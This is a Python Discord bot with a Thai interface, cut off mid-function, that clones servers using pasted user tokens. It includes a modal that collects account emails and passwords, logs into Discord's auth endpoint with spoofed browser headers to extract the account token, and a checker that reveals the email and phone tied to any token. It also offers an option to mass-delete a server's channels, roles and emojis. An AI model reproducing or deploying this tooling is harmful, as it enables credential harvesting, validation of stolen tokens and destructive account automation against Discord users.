import discord
from discord.ext import commands, tasks
from discord import ui, app_commands
import aiohttp
from aiohttp import web
import asyncio
import base64
import itertools
import io
import zipfile
import json
import os
from datetime import datetime

# =====================================================================
TOKEN = os.getenv("DISCORD_BOT_TOKEN", "")
OWNER_ID = int(os.getenv("DISCORD_OWNER_ID", "1564080596173721670"))
GUILD_ID = 1204647300870311986
GIF_URL = "https://cdn.discordapp.com/attachments/1542432996701900870/1564081671081304116/turn-anime.gif?ex=6adff811&is=6adea691&hm=e1aa4a485c432703096b2135767c090df884c98dca14e074874dcadf674bb46c&"
# =====================================================================

def _build_super_properties():
    props = {
        "os": "Windows", "browser": "Chrome", "device": "", "system_locale": "th-TH",
        "client_version": "1.0.0", "os_version": "10.0.0",
        "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "browser_version": "121.0.0.0", "os_sdk_version": "10", "client_build_number": 250000,
        "native_build_number": 1, "client_event_source": None
    }
    return base64.b64encode(json.dumps(props, separators=(',', ':')).encode()).decode()

SUPER_PROPERTIES = _build_super_properties()
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"

async def get_discord_token(email, password):
    async with aiohttp.ClientSession() as session:
        payload = {"login": email, "password": password, "undelete": False, "captcha_key": None, "login_source": None, "gift_code_sku_id": None}
        headers = {
            "Content-Type": "application/json", "User-Agent": USER_AGENT, "Accept": "*/*",
            "Accept-Language": "th,en-US;q=0.9,en;q=0.8", "Referer": "https://discord.com/login",
            "Origin": "https://discord.com", "X-Discord-Locale": "th",
            "X-Debug-Options": "bugReporterEnabled", "X-Super-Properties": SUPER_PROPERTIES
        }
        try:
            async with session.post("https://discord.com/api/v10/auth/login", json=payload, headers=headers) as resp:
                data = await resp.json()
                if resp.status == 200 and "token" in data: return data["token"], None
                errors = data.get("errors", {}) or {}
                msg = str(data.get("message", "")).lower()
                if "captcha" in msg or "captcha_key" in errors: return None, "captcha"
                elif "password" in errors or "invalid_login" in msg: return None, "password"
                elif "email" in msg or "location" in msg: return None, "verification"
                elif "mfa" in msg or "mfa" in errors: return None, "2fa_enabled"
                elif resp.status == 429: return None, "ratelimit"
                return None, f"Error {resp.status}: {msg if msg else 'Bad Request'}"
        except Exception as e: return None, f"Connection Fail: {str(e)}"

class LoginModal(ui.Modal, title="ยืนยันตัวตนเพื่อดึง Token"):
    email = ui.TextInput(label="อีเมล Discord", placeholder="username@email.com", required=True)
    password = ui.TextInput(label="รหัสผ่าน", placeholder="กรอกรหัสผ่านของคุณที่นี่", style=discord.TextStyle.short, required=True)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        status_embed = discord.Embed(title="⏳ กำลังตรวจสอบระบบ...", description="ระบบกำลังพยายามเข้าถึงข้อมูลของคุณ โปรดรอสักครู่", color=0x5865F2)
        msg = await interaction.followup.send(embed=status_embed, ephemeral=True)
        token, error_type = await get_discord_token(self.email.value, self.password.value)
        if token:
            success_embed = discord.Embed(title="✅ ดึง Token สำเร็จ!", description="นี่คือโทเคนของคุณ :", color=0x57F287)
            success_embed.add_field(name="🔑 TOKEN", value=f"```\n{token}\n```", inline=False)
            await interaction.followup.edit_message(message_id=msg.id, embed=success_embed)
        else:
            error_embed = discord.Embed(title="❌ ล้มเหลว", color=0xED4245)
            if error_type == "verification":
                error_embed.title = "⚠️ ตรวจพบการป้องกัน"
                error_embed.description = "คุณจะต้อง **อนุญาตการเข้าสู่ระบบ** ในอีเมลของคุณก่อน แล้วค่อยกลับมาลองใหม่"
            elif error_type == "password": error_embed.description = "รหัสผ่านไม่ถูกต้อง หรือข้อมูลล็อกอินผิดพลาด"
            elif error_type == "captcha":
                error_embed.title = "🧩 ติดระบบ CAPTCHA"
                error_embed.description = "Discord บังคับให้แก้ CAPTCHA ระบบไม่สามารถดึงข้อมูลได้อัตโนมัติ"
            elif error_type == "2fa_enabled":
                error_embed.title = "🔐 ติดรหัส 2FA"
                error_embed.description = "บัญชีนี้เปิดการยืนยันตัวตน 2 ชั้น ระบบไม่สามารถข้ามขั้นตอนนี้ได้"
            elif error_type == "ratelimit": error_embed.description = "คุณทำรายการบ่อยเกินไป กรุณารอสักครู่แล้วลองใหม่"
            else: error_embed.description = f"สาเหตุ: {error_type}"
            await interaction.followup.edit_message(message_id=msg.id, embed=error_embed)

def build_copy_v2_components():
    return [
        {
            "type": 17,
            "components": [
                {"type": 10, "content": "# ❄️﹒𝐂𝐎𝐏𝐘 𝐒𝐄𝐑𝐕𝐄𝐑\n-# ``` copy server discord free ```"},
                {"type": 14, "divider": True, "spacing": 1},
                {
                    "type": 10,
                    "content": (
                        "📌 **ฟีเจอร์ทั้งหมด**\n"
                        "➤ ก๊อปปี้ช่อง / ยศ / อิโมจิ / สติ๊กเกอร์\n"
                        "🛒 ก๊อปแยกส่วนได้\n"
                        "😀 เช็ค Token สถานะ\n"
                        "🔑 ดึง User Token\n\n"
                        "-# ลิขสิทธิ์ : tamarind_2007 • © All AI deepseek"
                    )
                },
                {"type": 14, "divider": True, "spacing": 1},
                {"type": 12, "items": [{"media": {"url": GIF_URL}}]},
                {"type": 14, "divider": False, "spacing": 1},
                {
                    "type": 1,
                    "components": [{
                        "type": 3, "custom_id": "more_options_select",
                        "placeholder": "|︲ เมนูตัวเลือกเพิ่มเติม 1 ︲|",
                        "options": [
                            {"label": "วิธีหา Token", "value": "how_to_token", "emoji": {"name": "📖"}},
                            {"label": "เช็ค ID เซิร์ฟเวอร์ผู้ใช้", "value": "check_guild_ids", "emoji": {"name": "🔍"}},
                            {"label": "ล้างตัวเลือกทั้งหมด", "value": "clear_all", "emoji": {"name": "🗑️"}}
                        ]
                    }]
                },
                {
                    "type": 1,
                    "components": [{
                        "type": 3, "custom_id": "multi_select",
                        "placeholder": "|︲ เมนูตัวเลือกเพิ่มเติม 2 ︲|",
                        "options": [
                            {"label": "ก๊อปแค่ช่องและหมวดหมู่", "value": "ch", "emoji": {"name": "⭐"}},
                            {"label": "ก๊อปแค่บทบาทเท่านั้น", "value": "rl", "emoji": {"name": "🌈"}},
                            {"label": "ก๊อปแค่อิโมจิเท่านั้น", "value": "em", "emoji": {"name": "😢"}},
                            {"label": "ล้างตัวเลือกทั้งหมด", "value": "clear", "emoji": {"name": "🗑️"}}
                        ]
                    }]
                },
                {
                    "type": 1,
                    "components": [{
                        "type": 3, "custom_id": "extra_select",
                        "placeholder": "|︲ เมนูตัวเลือกเพิ่มเติม 3 ︲|",
                        "options": [
                            {"label": "ก๊อปไฟล์อิโมจิ", "value": "dl_emoji", "emoji": {"name": "🌈"}},
                            {"label": "ล้างตัวเลือกทั้งหมด", "value": "clear_extra", "emoji": {"name": "🗑️"}}
                        ]
                    }]
                },
                {
                    "type": 1,
                    "components": [
                        {"type": 2, "style": 5, "label": "𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦", "url": "https://www.instagram.com/boundless_835?igsh=MXNjMHo1NGZleXA2Mw==", "emoji": {"name": "📸"}},
                        {"type": 2, "style": 5, "label": "𝐒𝐞𝐫𝐯𝐞𝐫 𝐃𝐢𝐬𝐜𝐨𝐫𝐝", "url": "https://discord.gg/68wdmyYBcX", "emoji": {"name": "💬"}}
                    ]
                },
                {
                    "type": 1,
                    "components": [
                        {"type": 2, "style": 4, "label": "⌜ 𝐂𝐨𝐩𝐲 𝐒𝐞𝐫𝐯𝐞𝐫 ⌟", "custom_id": "main_clone_btn", "emoji": {"name": "🔄"}},
                        {"type": 2, "style": 1, "label": "⌜ 𝐓𝐨𝐤𝐞𝐧 𝐂𝐡𝐞𝐜𝐤 ⌟", "custom_id": "token_check_btn", "emoji": {"name": "🔑"}},
                        {"type": 2, "style": 3, "label": "⌜ ดึง 𝐔𝐬𝐞𝐫 𝐓𝐨𝐤𝐞𝐧 ⌟", "custom_id": "rlzx_extract_btn", "emoji": {"name": "📥"}}
                    ]
                }
            ]
        }
    ]

intents = discord.Intents.all()

async def safe_followup(it: discord.Interaction, content=None, *, embed=None, ephemeral=True):
    try:
        if embed is not None: return await it.followup.send(content=content, embed=embed, ephemeral=ephemeral)
        return await it.followup.send(content=content, ephemeral=ephemeral)
    except (discord.NotFound, discord.HTTPException):
        try:
            channel = it.channel
            if channel is not None:
                if embed is not None: return await channel.send(content=content, embed=embed)
                return await channel.send(content=content)
        except Exception: pass
    except Exception: pass
    return None

async def safe_send_response(it: discord.Interaction, content=None, *, embed=None, ephemeral=True):
    try:
        if embed is not None: return await it.response.send_message(content=content, embed=embed, ephemeral=ephemeral)
        return await it.response.send_message(content=content, ephemeral=ephemeral)
    except (discord.NotFound, discord.HTTPException): return None

async def handle_rate_limit(resp):
    if resp.status == 429:
        try:
            data = await resp.json()
            retry_after = float(data.get("retry_after", 2.0))
        except Exception: retry_after = 2.0
        await asyncio.sleep(retry_after + 0.5)
        return True
    return False

async def handle_ping(request):
    return web.Response(text="Bot is alive!", status=200)

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    app.router.add_get('/health', handle_ping)
    port = int(os.getenv("PORT", 10000))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"[Web] Server กำลังทำงานบน Port {port}")

class TenjikuUltimate(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=intents)
        self.status_list = itertools.cycle(["บอทก๊อปดิส", "꒰|︲{guild_count} เซิร์ฟเวอร์ | {user_count} สมาชิก︲|꒱"])

    async def setup_hook(self):
        self.add_view(CopyView())
        self.presence_updater.start()
        self.ping_render.start()
        try: await start_web_server()
        except Exception as e: print(f"[Web] ไม่สามารถเริ่ม Web Server ได้: {e}")

        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        bot_name = str(self.user.name) if self.user else "Unknown"
        bot_id = str(self.user.id) if self.user else "Unknown"
        print("╔════════════════════════════════════════════════════╗")
        print("║                     Copy Bot                       ║")
        print("╠════════════════════════════════════════════════════╣")
        print(f"║  ชื่อบอท        : {bot_name.ljust(35)}║")
        print(f"║  ไอดีบอท       : {bot_id.ljust(35)}║")
        print(f"║  เวลา         : {now.ljust(35)}║")
        print("║                                                    ║")
        print("║  ลิขสิทธิ์        : แมวส้ม                          ║")
        print("║  Copyright    : All AI deepseek                    ║")
        print("╚════════════════════════════════════════════════════╝")

    @tasks.loop(seconds=10)
    async def presence_updater(self):
        if not self.is_ready(): return
        try:
            total_users = sum(g.member_count for g in self.guilds)
            current_status = next(self.status_list).format(guild_count=len(self.guilds), user_count=total_users)
            activity = discord.Streaming(name=current_status, url="https://www.twitch.tv/real_king")
            await self.change_presence(activity=activity)
        except Exception as e: print(f"Presence Error: {e}")

    @tasks.loop(minutes=5)
    async def ping_render(self):
        if not self.is_ready(): return
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(os.getenv("RENDER_EXTERNAL_URL", "https://mybot24hr-v2.onrender.com"), timeout=15) as resp:
                    print(f"[Ping] สถานะ: {resp.status} - {datetime.now().strftime('%H:%M:%S')}")
        except Exception as e: print(f"[Ping] เกิดข้อผิดพลาด: {e}")

bot = TenjikuUltimate()

async def clone_messages(session, headers, base_url, src_ch_id, dst_ch_id, limit):
    if limit <= 0: return
    webhook_url = None
    async with session.post(f"{base_url}/channels/{dst_ch_id}/webhooks", headers=headers, json={"name": "Copy-Webhook"}) as w_res:
        if w_res.status in [200, 201]:
            w_json = await w_res.json()
            webhook_url = f"https://discord.com/api/webhooks/{w_json['id']}/{w_json['token']}"

    async with session.get(f"{base_url}/channels/{src_ch_id}/messages?limit={limit}", headers=headers) as r:
        if await handle_rate_limit(r): pass
        if r.status == 200:
            msgs = await r.json()
            for msg in reversed(msgs):
                content = msg.get('content', '')
                if msg.get('attachments'):
                    for att in msg['attachments']: content += f"\n{att['url']}"
                if msg.get('sticker_items'):
                    for st in msg['sticker_items']: content += f"\nhttps://cdn.discordapp.com/stickers/{st['id']}.png"
                embeds = msg.get('embeds', [])
                if content.strip() or embeds:
                    if webhook_url:
                        payload = {"content": content, "embeds": embeds, "username": msg['author']['username'], "avatar_url": f"https://cdn.discordapp.com/avatars/{msg['author']['id']}/{msg['author']['avatar']}.png" if msg['author'].get('avatar') else None}
                        wh_resp = await session.post(webhook_url, json=payload)
                        if wh_resp.status == 429:
                            try:
                                d = await wh_resp.json()
                                await asyncio.sleep(float(d.get("retry_after", 1.0)) + 0.3)
                            except Exception: await asyncio.sleep(1.0)
                    else:
                        payload = {"content": content, "embeds": embeds}
                        resp2 = await session.post(f"{base_url}/channels/{dst_ch_id}/messages", headers=headers, json=payload)
                        if resp2.status == 429: await handle_rate_limit(resp2)
                    await asyncio.sleep(0.6)

async def run_clone_process(it: discord.Interaction, user_token: str, src_id: str, dst_id: str, delete_confirm: str, msg_limit: str):
    headers = {"Authorization": user_token, "Content-Type": "application/json"}
    raw_headers = {"Authorization": user_token}
    base_url = "https://discord.com/api/v9"
    do_clean = delete_confirm.strip() == "ใช่"
    try: limit = int(msg_limit)
    except: limit = 0
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{base_url}/guilds/{dst_id}", headers=headers) as r:
            if r.status != 200: return await safe_followup(it, "❌ Token ไม่ถูกต้อง หรือไม่มีสิทธิ์ในปลายทาง!")
        await safe_followup(it, "⚙️ กำลังเริ่มก๊อปปี้เซิร์ฟเวอร์...")
        if do_clean:
            res_ch = await session.get(f"{base_url}/guilds/{dst_id}/channels", headers=headers)
            if await handle_rate_limit(res_ch): pass
            if res_ch.status == 200:
                for ch in await res_ch.json():
                    d = await session.delete(f"{base_url}/channels/{ch['id']}", headers=headers)
                    if d.status == 429: await handle_rate_limit(d)
                    await asyncio.sleep(0.2)
            res_rl = await session.get(f"{base_url}/guilds/{dst_id}/roles", headers=headers)
            if await handle_rate_limit(res_rl): pass
            if res_rl.status == 200:
                for rl in await res_rl.json():
                    if rl['name'] != "@everyone" and not rl.get('managed'):
                        d = await session.delete(f"{base_url}/guilds/{dst_id}/roles/{rl['id']}", headers=headers)
                        if d.status == 429: await handle_rate_limit(d)
                        await asyncio.sleep(0.2)
            res_em = await session.get(f"{base_url}/guilds/{dst_id}/emojis", headers=headers)
            if await handle_rate_limit(res_em): pass
            if res_em.status == 200:
                for em in await res_em.json():
                    d = await session.delete(f"{base_url}/guilds/{dst_id}/emojis/{em['id']}", headers=headers)
                    if d.status == 429: await handle_rate_limit(d)
                    await asyncio.sleep(0.1)
            res_st = await session.get(f"{base_url}/guilds/{dst_id}/stickers", headers=headers)
            if await handle_rate_limit(res_st): pass
            if res_st.status == 200:
                for st in await res_st.json():
                    d = await session.delete(f"{base_url}/guilds/{dst_id}/stickers/{st['id']}", headers=headers)
                    if d.status == 429: await handle_rate_limit(d)
                    await asyncio.sleep(0.1)
        tasks_fetch = [session.get(f"{base_url}/guilds/{src_id}/roles", headers=headers), session.get(f"{base_url}/guilds/{src_id}/channels", headers=headers), session.get(f"{base_url}/guilds/{src_id}/emojis", headers=headers), session.get(f"{base_url}/guilds/{src_id}/stickers", headers=headers)]
        responses = await asyncio.gather(*tasks_fetch)
        for resp in responses:
            if await handle_rate_limit(resp): pass
        r_roles = await responses[0].json()
        r_channels = await responses[1].json()
        r_emojis = await responses[2].json()
        r_stickers = await responses[3].json()
        role_map = {}
        sorted_src_roles = sorted([r for r in r_roles if r['name'] != "@everyone" and not r.get('managed')], key=lambda x: x['position'], reverse=True)
        for role in sorted_src_roles:
            payload = {"name": role['name'], "permissions": role['permissions'], "color": role['color'], "hoist": role['hoist'], "mentionable": role['mentionable']}
            async with session.post(f"{base_url}/guilds/{dst_id}/roles", headers=headers, json=payload) as pr:
                if pr.status == 429: await handle_rate_limit(pr)
                if pr.status == 201:
                    res = await pr.json()
                    role_map[role['id']] = res['id']
            await asyncio.sleep(0.8)
        for emoji in r_emojis:
            try:
                ext = "gif" if emoji['animated'] else "png"
                img_url = f"https://cdn.discordapp.com/emojis/{emoji['id']}.{ext}"
                async with session.get(img_url) as img_r:
                    if img_r.status == 200:
                        img_b64 = base64.b64encode(await img_r.read()).decode()
                        pr = await session.post(f"{base_url}/guilds/{dst_id}/emojis", headers=headers, json={"name": emoji['name'], "image": f"data:image/{ext};base64,{img_b64}"})
                        if pr.status == 429: await handle_rate_limit(pr)
            except: pass
            await asyncio.sleep(0.4)
        for sticker in r_stickers:
            try:
                async with session.get(f"https://cdn.discordapp.com/stickers/{sticker['id']}.png") as img_r:
                    if img_r.status == 200:
                        form = aiohttp.FormData()
                        form.add_field('name', sticker['name'])
                        form.add_field('tags', sticker['tags'])
                        form.add_field('file', await img_r.read(), filename="sticker.png", content_type='image/png')
                        pr = await session.post(f"{base_url}/guilds/{dst_id}/stickers", headers=raw_headers, data=form)
                        if pr.status == 429: await handle_rate_limit(pr)
            except: pass
            await asyncio.sleep(0.5)
        cat_map = {}
        sorted_all_ch = sorted(r_channels, key=lambda x: x.get('position', 0))
        for ch in sorted_all_ch:
            if ch['type'] == 4:
                async with session.post(f"{base_url}/guilds/{dst_id}/channels", headers=headers, json={"name": ch['name'], "type": 4}) as pc:
                    if pc.status == 429: await handle_rate_limit(pc)
                    if pc.status == 201: cat_map[ch['id']] = (await pc.json())['id']
                await asyncio.sleep(0.5)
        for ch in sorted_all_ch:
            if ch['type'] == 4: continue
            ovs = [{"id": role_map.get(ov['id'], dst_id if ov['id'] == src_id else ov['id']), "type": ov['type'], "allow": ov['allow'], "deny": ov['deny']} for ov in ch.get('permission_overwrites', [])]
            payload = {"name": ch['name'], "type": ch['type'], "topic": ch.get('topic'), "parent_id": cat_map.get(ch.get('parent_id')), "permission_overwrites": ovs}
            async with session.post(f"{base_url}/guilds/{dst_id}/channels", headers=headers, json=payload) as pcc:
                if pcc.status == 429: await handle_rate_limit(pcc)
                if pcc.status == 201 and limit > 0:
                    new_ch = await pcc.json()
                    await clone_messages(session, headers, base_url, ch['id'], new_ch['id'], limit)
            await asyncio.sleep(0.5)
    await safe_followup(it, "✅ ก๊อปปี้เซิร์ฟเวอร์สำเร็จเสร็จสิ้น!")

async def run_part_clone(it, user_token, src_id, dst_id, mode):
    headers = {"Authorization": user_token, "Content-Type": "application/json"}
    base_url = "https://discord.com/api/v9"
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{base_url}/guilds/{dst_id}", headers=headers) as r:
            if r.status != 200: return await safe_followup(it, "❌ Token ไม่ถูกต้อง!")
        await safe_followup(it, "⚙️ กำลังเริ่มก๊อปปี้เซิร์ฟเวอร์...")
        if mode == "ch":
            res = await session.get(f"{base_url}/guilds/{src_id}/channels", headers=headers)
            if await handle_rate_limit(res): pass
            if res.status == 200:
                chs = await res.json(); cat_map = {}
                for ch in sorted(chs, key=lambda x: x.get('position', 0)):
                    if ch['type'] == 4:
                        async with session.post(f"{base_url}/guilds/{dst_id}/channels", headers=headers, json={"name": ch['name'], "type": 4}) as pc:
                            if pc.status == 429: await handle_rate_limit(pc)
                            if pc.status == 201: cat_map[ch['id']] = (await pc.json())['id']
                        await asyncio.sleep(0.3)
                for ch in [c for c in chs if c['type'] != 4]:
                    pc = await session.post(f"{base_url}/guilds/{dst_id}/channels", headers=headers, json={"name": ch['name'], "type": ch['type'], "parent_id": cat_map.get(ch.get('parent_id'))})
                    if pc.status == 429: await handle_rate_limit(pc)
                    await asyncio.sleep(0.3)
        elif mode == "rl":
            res = await session.get(f"{base_url}/guilds/{src_id}/roles", headers=headers)
            if await handle_rate_limit(res): pass
            if res.status == 200:
                for rl in sorted(await res.json(), key=lambda x: x['position'], reverse=True):
                    if rl['name'] != "@everyone" and not rl.get('managed'):
                        pr = await session.post(f"{base_url}/guilds/{dst_id}/roles", headers=headers, json={"name": rl['name'], "permissions": rl['permissions'], "color": rl['color'], "hoist": rl['hoist']})
                        if pr.status == 429: await handle_rate_limit(pr)
                        await asyncio.sleep(0.4)
        elif mode == "em":
            res = await session.get(f"{base_url}/guilds/{src_id}/emojis", headers=headers)
            if await handle_rate_limit(res): pass
            if res.status == 200:
                for em in await res.json():
                    ext = "gif" if em['animated'] else "png"
                    async with session.get(f"https://cdn.discordapp.com/emojis/{em['id']}.{ext}") as img_r:
                        if img_r.status == 200:
                            img_b64 = base64.b64encode(await img_r.read()).decode()
                            pr = await session.post(f"{base_url}/guilds/{dst_id}/emojis", headers=headers, json={"name": em['name'], "image": f"data:image/{ext};base64,{img_b64}"})
                            if pr.status == 429: await handle_rate_limit(pr)
                    await asyncio.sleep(0.4)
        await safe_followup(it, "✅ ก๊อปปี้เซิร์ฟเวอร์สำเร็จเสร็จสิ้น!")

async def download_emojis_to_dm(it, user_token, src_id):
    headers = {"Authorization": user_token}
    base_url = "https://discord.com/api/v9"
    await safe_followup(it, "⚙️ กำลังรวบรวมไฟล์อิโมจิ...")
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{base_url}/guilds/{src_id}/emojis", headers=headers) as r:
            if await handle_rate_limit(r): pass
            if r.status != 200: return await safe_followup(it, "❌ ไม่สามารถดึงข้อมูลได้ (Token หรือ ID ผิด)")
            emojis = await r.json()
            if not emojis: return await safe_followup(it, "เซิร์ฟเวอร์นี้ไม่มีอิโมจิให้ก๊อป!")
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, "a", zipfile.ZIP_DEFLATED, False) as zip_file:
                for em in emojis:
                    ext = "gif" if em['animated'] else "png"
                    url = f"https://cdn.discordapp.com/emojis/{em['id']}.{ext}"
                    async with session.get(url) as img_r:
                        if img_r.status == 200: zip_file.writestr(f"{em['name']}.{ext}", await img_r.read())
            zip_buffer.seek(0)
            try:
                dm = it.user.dm_channel or await it.user.create_dm()
                await dm.send(content=f"📦 ไฟล์อิโมจิจากเซิร์ฟเวอร์ ID: `{src_id}`", file=discord.File(zip_buffer, filename="emojis.zip"))
                await safe_followup(it, "✅ ก๊อปไฟล์อิโมจิสำเร็จโปรดดูผ่าน DM")
            except discord.Forbidden: await safe_followup(it, "ไม่สามารถส่ง DM ได้! กรุณาเปิดรับข้อความส่วนตัว")

class CopyModal(ui.Modal, title='BOT COPY SERVER'):
    token = ui.TextInput(label='User Token ของคุณ', placeholder='วาง Token ที่นี่...', required=True)
    src = ui.TextInput(label='ID เซิร์ฟเวอร์ต้นทาง', placeholder='ID ต้นทาง...', required=True)
    dst = ui.TextInput(label='ID เซิร์ฟเวอร์ปลายทาง', placeholder='ID ปลายทาง...', required=True)
    clean = ui.TextInput(label='ลบห้องและยศเก่าไหม?', placeholder='พิมพ์ "ใช่" เพื่อลบ / พิมพ์ "ไม่" เพื่อไม่ลบ', required=True, min_length=2, max_length=3)
    limit = ui.TextInput(label='จำนวนข้อความต่อช่อง (0-100)', placeholder='ใส่ 0 เพื่อไม่ก๊อปข้อความ', default="0", required=True, max_length=3)
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        await run_clone_process(interaction, self.token.value, self.src.value, self.dst.value, self.clean.value, self.limit.value)

class PartCopyModal(ui.Modal, title='BOT COPY SERVER'):
    def __init__(self, mode):
        super().__init__()
        self.mode = mode
    token = ui.TextInput(label='User Token ของคุณ', placeholder='วาง Token ที่นี่...', required=True)
    src = ui.TextInput(label='ID เซิร์ฟเวอร์ต้นทาง', placeholder='ID ต้นทาง...', required=True)
    dst = ui.TextInput(label='ID เซิร์ฟเวอร์ปลายทาง', placeholder='ID ปลายทาง...', required=True)
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        await run_part_clone(interaction, self.token.value, self.src.value, self.dst.value, self.mode)

class EmojiDownloadModal(ui.Modal, title='ก๊อปไฟล์อิโมจิ'):
    token = ui.TextInput(label='User Token ของคุณ', placeholder='วาง Token ที่นี่...', required=True)
    src = ui.TextInput(label='ID เซิร์ฟเวอร์ต้นทาง', placeholder='ID ต้นทาง...', required=True)
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        await download_emojis_to_dm(interaction, self.token.value, self.src.value)

class TokenCheckModal(ui.Modal, title='Token Check Status'):
    token = ui.TextInput(label='กรอก User Token', placeholder='วางโทเคนตรงนี้...', required=True)
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        headers = {"Authorization": self.token.value, "Content-Type": "application/json", "User-Agent": USER_AGENT, "Accept": "*/*", "Accept-Language": "th,en-US;q=0.9,en;q=0.8", "Referer": "https://discord.com/", "Origin": "https://discord.com", "X-Super-Properties": SUPER_PROPERTIES}
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://discord.com/api/v10/users/@me", headers=headers) as r:
                    if await handle_rate_limit(r): pass
                    if r.status == 200:
                        data = await r.json()
                        nitro = {0:"ไม่มี Nitro", 1:"Nitro Classic", 2:"Nitro Boost / Full", 3:"Nitro Basic"}.get(data.get('premium_type', 0), "ไม่มี Nitro")
                        emb = discord.Embed(title="✅ ตรวจสอบโทเคนสำเร็จ", color=0x00FF00)
                        emb.add_field(name="ชื่อผู้ใช้", value=f"```{data['username']}```", inline=True)
                        emb.add_field(name="ไอดี", value=f"```{data['id']}```", inline=True)
                        emb.add_field(name="อีเมล", value=f"```{data.get('email') or 'ไม่ได้ผูก'}```", inline=False)
                        emb.add_field(name="เบอร์โทร", value=f"```{data.get('phone') or 'ไม่ได้ผูก'}```", inline=True)
                        emb.add_field(name="สถานะ Nitro", value=f"```{nitro}```", inline=True)
                        await safe_followup(interaction, embed=emb)
                    elif r.status == 429: await safe_followup(interaction, "⚠️ โดน Rate Limit ชั่วคราว กรุณารอสักครู่แล้วลองใหม่")
                    else:
                        emb = discord.Embed(title="❌ ตรวจสอบโทเคนล้มเหลว", description="โทเคนไม่ถูกต้อง หรือ โทเคนตายแล้ว", color=0xFF0000)
                        await safe_followup(interaction, embed=emb)
        except aiohttp.ClientError: await safe_followup(interaction, "❌ เชื่อมต่อ Discord API ไม่ได้ กรุณาลองใหม่")

class ServerPaginator(ui.View):
    def __init__(self, data, page=0):
        super().__init__(timeout=60)
        self.data = data
        self.page = page
        self.per_page = 20
        self.max_pages = max(0, (len(data) - 1) // self.per_page)
    def get_embed(self):
        start = self.page * self.per_page
        end = start + self.per_page
        current_data = self.data[start:end]
        desc = ""
        for i, guild in enumerate(current_data, start=1): desc += f"{i+start}. **{guild['name']}**\n`{guild['id']}`\n"
        emb = discord.Embed(title="📋 รายชื่อเซิร์ฟเวอร์ที่คุณอยู่", description=desc, color=0x5865F2)
        emb.set_author(name=f"หน้า {self.page + 1}/{self.max_pages + 1} | ทั้งหมด {len(self.data)} เซิร์ฟเวอร์")
        return emb
    @ui.button(label="ก่อนหน้า", style=discord.ButtonStyle.gray)
    async def prev(self, it: discord.Interaction, btn: ui.Button):
        if self.page > 0:
            self.page -= 1
            await it.response.edit_message(embed=self.get_embed(), view=self)
        else: await it.response.defer()
    @ui.button(label="ถัดไป", style=discord.ButtonStyle.gray)
    async def next(self, it: discord.Interaction, btn: ui.Button):
        if self.page < self.max_pages:
            self.page += 1
            await it.response.edit_message(embed=self.get_embed(), view=self)
        else: await it.response.defer()

class UserGuildsModal(ui.Modal, title='เช็ค ID เซิร์ฟเวอร์ผู้ใช้'):
    token = ui.TextInput(label='กรอก User Token', placeholder='วางโทเคนเพื่อดึงรายชื่อดิส...', required=True)
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        headers = {"Authorization": self.token.value}
        async with aiohttp.ClientSession() as session:
            async with session.get("https://discord.com/api/v9/users/@me/guilds", headers=headers) as r:
                if await handle_rate_limit(r): pass
                if r.status == 200:
                    data = await r.json()
                    if not data: return await safe_followup(interaction, "คุณไม่ได้อยู่ในดิสไหนเลยนะ")
                    view = ServerPaginator(data)
                    try: await interaction.followup.send(embed=view.get_embed(), view=view, ephemeral=True)
                    except Exception: pass
                else: await safe_followup(interaction, "❌ โทเคนผิดหรือปลิวไปแล้ว!")

class CopyView(ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    @ui.button(custom_id="main_clone_btn", label="⌜ 𝐂𝐨𝐩𝐲 𝐒𝐞𝐫𝐯𝐞𝐫 ⌟", style=discord.ButtonStyle.danger, row=0)
    async def start_copy(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.send_modal(CopyModal())
    @ui.button(custom_id="token_check_btn", label="⌜ 𝐓𝐨𝐤𝐞𝐧 𝐂𝐡𝐞𝐜𝐤 ⌟", style=discord.ButtonStyle.primary, row=0)
    async def check_token(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.send_modal(TokenCheckModal())
    @ui.button(custom_id="rlzx_extract_btn", label="⌜ ดึง 𝐔𝐬𝐞𝐫 𝐓𝐨𝐤𝐞𝐧 ⌟", style=discord.ButtonStyle.success, row=0)
    async def rlzx_button(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.send_modal(LoginModal())
    @ui.select(custom_id="more_options_select", placeholder="|︲ เมนูตัวเลือกเพิ่มเติม 1 ︲|", row=1, options=[
        discord.SelectOption(label="วิธีหา Token", value="how_to_token", emoji="📖"),
        discord.SelectOption(label="เช็ค ID เซิร์ฟเวอร์ผู้ใช้", value="check_guild_ids", emoji="🔍"),
        discord.SelectOption(label="ล้างตัวเลือกทั้งหมด", value="clear_all", emoji="🗑️"),
    ])
    async def more_options(self, interaction: discord.Interaction, select: ui.Select):
        if select.values[0] == "how_to_token":
            emb1 = discord.Embed(title="วิธีการหา User Token (PC/Computer)", color=0x5865F2)
            emb1.set_image(url="https://cdn.discordapp.com/attachments/1450467573253542030/1454754068873478258/image-7.png")
